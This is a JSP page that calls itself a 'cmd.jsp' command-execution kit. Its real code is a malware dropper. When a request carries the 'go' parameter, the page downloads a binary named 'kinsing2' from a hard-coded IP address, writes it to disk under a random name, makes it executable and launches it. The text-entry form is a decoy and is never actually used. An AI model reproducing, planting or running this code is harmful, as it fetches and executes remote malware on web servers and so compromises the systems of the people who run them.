
<%@ page import="java.io.BufferedInputStream,java.io.File" %>
<%@ page import="java.io.FileOutputStream" %>
<%@ page import="java.net.URL" %>
<%@ page import="java.util.Random" %>
<%
    //
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML>
<BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
    if (request.getParameter("go") != null) {
        Random rand = new Random();
        rand.setSeed(System.currentTimeMillis());
        String filename = "kinsing" + rand.nextInt();
        File f = new File(filename);
        BufferedInputStream in = new BufferedInputStream(new URL("http://62.113.115.166/kinsing2").openStream());
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(f);
            byte dataBuffer[] = new byte[1024];
            int bytesRead;
            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
                fileOutputStream.write(dataBuffer, 0, bytesRead);
            }
			fileOutputStream.close();
        } catch (Exception e) {
            // handle exception
        }
        in.close();
        System.out.println(f.getAbsolutePath());
        Process p = Runtime.getRuntime().exec("chmod +x " + filename);
        p.waitFor();
        ProcessBuilder builder = new ProcessBuilder("./" + filename);
        builder.inheritIO();
        builder.environment().put("SKL", "ws");
        builder.start();
    }
%>
</pre>
</BODY>
</HTML>
